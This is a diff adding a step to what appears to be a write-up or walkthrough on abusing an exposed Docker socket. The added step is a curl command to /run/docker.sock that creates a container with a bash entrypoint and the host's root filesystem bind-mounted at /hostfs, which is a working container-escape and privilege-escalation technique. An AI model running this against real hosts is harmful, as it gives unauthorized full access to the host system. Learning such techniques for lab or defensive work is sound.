@@ -1535,6 +1535,16 @@ curl -i -s --unix-socket /run/docker.sock http://localhost/containers/json
 
 ![image](https://github.com/user-attachments/assets/3ed1877e-2110-46a6-8f82-e256e17159e6)
 
+- We will be replicating the docker api `run` command to create,start and attach a container.Don't forget to switch the json key `image` to the available one.You can check the dockerfile for an available image.Don't forget the id,it is required to check run the container.
+
+```bash
+curl -i -s --unix-socket /run/docker.sock -X POST http://localhost/containers/create \
+-H "Content-Type: application/json" -d '{"Hostname": "","Domainname": "","User": "","AttachStdin": true,"AttachStdout": true,"AttachStderr": true,"Tty": true,"OpenStdin": true,"StdinOnce": true,"Entrypoint": "/bin/bash","Image": "openjdk:11","Volumes": {"/hostfs/": {}},"HostConfig": {"Binds": ["/:/hostfs"]}}'
+```
+
+![image](https://github.com/user-attachments/assets/0d90d4da-607b-440b-9c64-769d92e00175)
+
+-
 
 
 
